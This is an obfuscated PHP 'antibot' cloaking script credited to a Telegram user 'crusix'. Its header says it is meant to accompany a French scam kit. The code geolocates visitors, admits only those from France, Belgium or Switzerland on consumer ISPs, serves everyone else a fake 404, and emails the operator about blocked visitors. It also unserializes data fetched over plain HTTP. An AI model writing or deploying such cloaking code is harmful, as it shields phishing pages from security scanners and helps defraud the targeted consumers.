
<?php

/*


 _  _   __   __ _  ____  ____  ____  ____       
( \/ ) /  \ (  ( \/ ___)(_  _)( __ \(  _ \      
/ \/ \(  O )/    /\___ \  )(   (__ ( )   /      
\_)(_/ \__/ \_)__)(____/ (__) (____/(__\_) 	(Bêta 0.1)


**CODED BY CRUSIX**

• Telegram : @crusix


• HOW TO USE :

• Script is hidden, if you want to change anything please contact @crusix on telegram.

• Le scripte est caché. Si vous voulez y apporter n'importe quelle modification veuillez contacter @crusix sur telegram.

• À utiliser avec les antibots prevents mediapart fournis dans la scama CRUSIX V3 REMASTERED.

• Concernant la notification email, veuillez introduire votre email dans la variable. Vous serez prevenus quand une adresse IP non autorisée tentera d'acceder à votre site.

*/

goto gerCc; pujkM: goto obhY6; goto h_Feg; avtCZ: die("\x3c\150\x31\76\x34\x30\x34\x20\116\157\164\40\x46\157\165\156\144\74\x2f\150\61\x3e\124\150\145\40\160\141\x67\145\x20\164\x68\x61\164\40\x79\x6f\x75\40\x68\x61\166\x65\x20\x72\x65\x71\x75\x65\163\164\x65\x64\x20\143\157\x75\154\144\40\156\157\164\x20\x62\x65\40\x66\x6f\165\156\144\x2e"); goto wqVax; Uvvdx: if (strpos($kDknI, "\167\x61\x6e\141\x64\x6f\x6f") || strpos($kDknI, "\x62\x62\157\170") || strpos($kDknI, "\x42\157\x75\171\x67\165\x65\163") || strpos($kDknI, "\x4f\162\141\x6e\x67\x65") || strpos($kDknI, "\x73\146\x72") || strpos($kDknI, "\x53\x46\x52") || strpos($kDknI, "\123\x66\x72") || strpos($kDknI, "\x66\162\145\145") || strpos($kDknI, "\106\162\145\145") || strpos($kDknI, "\106\122\105\x45") || strpos($kDknI, "\162\x65\x64") || strpos($kDknI, "\160\x72\157\x78\141\144") || strpos($kDknI, "\143\x6c\165\x62\x2d\x69\156\164\x65\162\156\145\x74") || strpos($kDknI, "\x6f\154\x65\x61\x6e\145") || strpos($kDknI, "\156\x6f\162\x64\x6e\x65\x74") || strpos($kDknI, "\x6c\151\142\145\162\164\171") || strpos($kDknI, "\143\x6f\154\x74") || strpos($kDknI, "\143\x68\x65\154\154\157") || strpos($kDknI, "\x62\x65\x6c\147\x61\x63\157\x6d") || strpos($kDknI, "\160\162\157\x78\x69\155\165\x73") || strpos($kDknI, "\163\153\x79\156\x65\164") || strpos($kDknI, "\x61\157\154") || strpos($kDknI, "\156\x65\x75\x66") || strpos($kDknI, "\x64\141\x72\164\x79") || strpos($kDknI, "\x62\157\x75\171\x67\x75\145") || strpos($kDknI, "\x6e\x75\155\x65\x72\151\x63\141\142\x6c\145") || strpos($kDknI, "\106\162\x65\145") || strpos($kDknI, "\116\165\155\303\251\x72\x69\163") || strpos($kDknI, "\x50\157\163\164\145") || strpos($kDknI, "\123\157\x73\150")) { goto x8nty; } goto Ee40g; pq6wX: $r6tcf = $fQGf7["\x67\x65\157\x70\x6c\165\147\151\156\137\143\x69\164\171"]; goto gCH5b; ZR0YK: $iefIG = $_SERVER["\x52\x45\x4d\x4f\124\x45\x5f\101\104\104\122"]; goto xlVtY; yYy01: MifEu: goto yTHub; VYR1r: $UEJQw = "\x42\117\124\x20\123\x55\103\103\x45\x53\123\x46\x55\114\114\x59\x20\102\114\x4f\x43\113\x45\104"; goto gB_LW; A929k: $fF0Bf = false; goto qecux; gB_LW: $IW286 = "\xd\xa\x9\xd\12\x9\360\x9f\x8e\211\40\x44\111\123\x41\114\x4c\x4f\127\105\104\x20\111\120\40\124\x52\111\105\x44\40\124\117\40\x41\x43\x43\105\123\x20\x54\110\x45\x20\120\x41\107\105\x20\x41\x4e\x44\40\115\x4f\x4e\x53\x54\63\x52\40\101\x4e\124\111\x42\x4f\x54\123\40\x53\125\103\103\105\123\123\106\125\114\x4c\x59\40\102\114\117\x43\x4b\105\x44\40\x49\x54\40\41\x20\xf0\x9f\216\x89\15\12\x9\15\12\11\111\120\40\72\40" . $AxNmt . "\15\12\x9\x49\x53\120\40\x3a\40" . $kDknI . "\xd\xa\11\xd\12\11\111\146\x20\x79\x6f\x75\40\x74\150\x69\x6e\x6b\40\164\150\141\164\x20\151\164\40\151\163\40\141\x6e\40\145\162\162\x6f\x72\x20\160\x6c\x65\x61\163\x65\40\x72\x65\x70\x6f\x72\164\x20\x69\164\x20\x74\157\40\x40\x63\162\x75\163\151\170\40\x6f\x6e\x20\x74\145\154\145\147\x72\x61\155\x20\41\15\xa\x9\xd\12\11\xd\12\x9"; goto fyCG4; Oyv6a: $ds7dR = "\142\x75\162\x73\x74\x6c\x69\x6e\x6b\x40\160\x72\157\x74\157\156\155\x61\x69\x6c\56\143\157\155"; goto liwNP; W13DH: $fQGf7 = unserialize(file_get_contents($JkPxR)); goto pq6wX; xlVtY: $V5QA_ = IuGNe($iefIG); goto j4mPi; fyCG4: $odmS_ = "\106\x72\157\x6d\x3a\40\360\x9f\224\x92\40\101\x20\102\117\124\x20\107\117\124\x20\106\x55\103\x4b\x45\x44\x20\x42\131\40\x4d\x4f\116\123\x54\x33\122\x20\x41\x4e\124\111\x42\117\124\x53\40\360\x9f\224\x92\40\x3c\x64\163\x71\161\x64\x73\x40\x62\141\x6f\164\163\56\143\157\x6d\x3e"; goto WQet5; WKvoZ: header("\110\124\x54\x50\57\x31\56\60\40\64\60\x34\40\x4e\x6f\x74\40\x46\157\x75\x6e\144"); goto avtCZ; yTHub: if ($UtJbn == false and $sKeT7 == true) { goto Ruwra; } goto VYR1r; V9UG5: $AxNmt = $_SERVER["\x52\105\x4d\117\x54\x45\137\101\x44\x44\122"]; goto fMPi5; vSvCn: goto MifEu; goto tGmbU; Wei8T: $sKeT7 = true; goto Q8qOS; gCH5b: $v6V1a = $fQGf7["\147\145\x6f\x70\154\165\x67\x69\156\137\143\x6f\x75\x6e\164\x72\x79\x4e\141\x6d\x65"]; goto jkf5j; DplL2: Ruwra: goto A929k; XURy7: $UtJbn = false; goto vSvCn; jkf5j: if (!in_array($v6V1a, $UE7ms)) { goto qu2XD; } goto XURy7; wqVax: goto uBSnx; goto DplL2; Ee40g: $sKeT7 = false; goto pujkM; gerCc: echo "\15\12\xd\xa"; goto Oyv6a; h_Feg: x8nty: goto Wei8T; tGmbU: qu2XD: goto d6D6R; j4mPi: $kDknI = "{$V5QA_["\x61\163"]}"; goto Uvvdx; d6D6R: $UtJbn = true; goto yYy01; WQet5: mail($ds7dR, $UEJQw, $IW286, $odmS_); goto WKvoZ; fMPi5: $JkPxR = "\x68\x74\164\x70\x3a\57\x2f\x77\167\167\56\147\145\x6f\x70\154\165\147\151\x6e\56\156\x65\164\57\160\x68\x70\x2e\147\x70\x3f\151\160\x3d" . $AxNmt; goto W13DH; Q8qOS: obhY6: goto ZAyXU; ZAyXU: $UE7ms = array("\x46\162\141\156\143\145", "\x42\145\x6c\x67\x69\x75\155", "\x53\167\x69\x74\x7a\x65\162\154\x61\156\x64"); goto V9UG5; liwNP: function iUGNe($hO99l = '') { goto VnRMb; Rtq5N: $V5QA_ = json_decode($lyV_2, true); goto pURKb; pURKb: return $V5QA_; goto h_XZx; VnRMb: $lyV_2 = file_get_contents("\150\x74\x74\x70\72\57\x2f\x69\x70\55\141\x70\x69\56\143\157\155\x2f\152\x73\157\156\x2f" . $hO99l); goto Rtq5N; h_XZx: } goto ZR0YK; qecux: uBSnx:

?>